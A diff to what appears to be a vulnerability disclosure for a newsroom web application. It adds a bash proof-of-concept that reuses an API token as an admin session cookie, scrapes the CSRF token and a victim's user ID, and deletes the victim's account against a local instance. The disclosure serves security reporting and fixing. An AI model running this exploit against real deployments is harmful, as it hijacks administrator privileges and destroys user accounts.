@@ -530,9 +530,72 @@ Connection: close
   "journalist_uuid": "92d08e5f-9116-4023-8dd0-045389dad120", 
                                                                
 ```
+I verified the new updated password by logging in via UI. Please see the below screenshot.
 
 <img width="1920" height="523" alt="image" src="https://github.com/user-attachments/assets/0f6e5796-051f-4c3f-9e39-8a43e558e999" />
 
+
+4. Delete a user account from this:
+   
+Use the following script directly in terminal to delete a user level account:
+
+```bash
+BASE=http://127.0.0.1:8081
+PASS='correct horse battery staple profanity oil chewy'
+OTP_SEED='JHCOGO7VCER3EJ4L'
+VICTIM_USER='dellsberg'
+
+# 1) Fresh admin API token
+OTP=$(oathtool --totp --base32 "$OTP_SEED")
+ADMIN_TOKEN=$(curl -sS -X POST "$BASE/api/v1/token" \
+  -H 'Content-Type: application/json' \
+  -d "{\"username\":\"journalist\",\"passphrase\":\"$PASS\",\"one_time_code\":\"$OTP\"}" \
+  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')
+
+echo "ADMIN_TOKEN_LEN=${#ADMIN_TOKEN}"
+curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" | jq
+
+# 2) Trigger bug state and load admin page with API token as cookie
+curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
+ADMIN_HTML=$(curl -s "$BASE/admin/" -H "Cookie: js=$ADMIN_TOKEN")
+
+# 3) Extract CSRF + victim id
+CSRF_ADMIN=$(printf '%s' "$ADMIN_HTML" | python3 -c '
+import re,sys
+h=sys.stdin.read()
+m=re.search(r"name=\"csrf_token\"[^>]*value=\"([^\"]+)\"", h) or re.search(r"value=\"([^\"]+)\"[^>]*name=\"csrf_token\"", h)
+print(m.group(1) if m else "")
+')
+
+TARGET_ID=$(printf '%s' "$ADMIN_HTML" | python3 -c '
+import re,sys
+user="'$VICTIM_USER'"
+h=sys.stdin.read()
+m=re.search(r"<th scope=\"row\">\s*"+re.escape(user)+r"\s*</th>.*?href=\"/admin/edit/(\d+)\"", h, re.S)
+print(m.group(1) if m else "")
+')
+
+echo "CSRF_LEN=${#CSRF_ADMIN} TARGET_ID=$TARGET_ID"
+[ -n "$CSRF_ADMIN" ] && [ -n "$TARGET_ID" ] || { echo "Parse failed"; exit 1; }
+
+# 4) Delete victim account as hijacked admin
+curl -i -s -X POST "$BASE/admin/delete/$TARGET_ID" \
+  -H "Cookie: js=$ADMIN_TOKEN" \
+  --data-urlencode "csrf_token=$CSRF_ADMIN" | head -n 20
+
+# 5) Verify victim disappears from admin page
+curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
+curl -s "$BASE/admin/" -H "Cookie: js=$ADMIN_TOKEN" | grep -F "$VICTIM_USER" \
+  && echo "STILL_PRESENT" || echo "DELETE_SUCCESS"
+
+# 6) Verify victim can no longer authenticate
+sleep 31
+OTP=$(oathtool --totp --base32 "$OTP_SEED")
+curl -i -s -X POST "$BASE/api/v1/token" \
+  -H 'Content-Type: application/json' \
+  -d "{\"username\":\"$VICTIM_USER\",\"passphrase\":\"$PASS\",\"one_time_code\":\"$OTP\"}" | head -n 20
+
+```
 
 
 ---
